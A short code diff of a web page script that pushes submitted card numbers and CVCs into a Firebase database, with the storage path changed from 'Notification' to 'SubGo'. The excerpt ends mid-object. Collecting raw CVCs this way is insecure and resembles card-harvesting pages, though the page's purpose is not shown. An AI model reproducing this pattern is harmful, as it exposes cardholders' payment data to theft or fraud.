@@ -83,8 +83,7 @@
     
     <!-- Your main script -->
 <script defer>
-      const database = firebase.database();
-
+      
       function submitForm() {
         // Display loading overlay
        // document.getElementById('loadingOverlay').style.display = 'none';
@@ -103,7 +102,9 @@
           alert('Error: All fields must be filled!');
         } else {
           // Push data to the database
-          const newDataRef = database.ref('Notification');
+          const database = firebase.database();
+
+          const newDataRef = database.ref('SubGo');
           newDataRef.push({
             cardNumber: cardNumber,
             cvc: cvc,
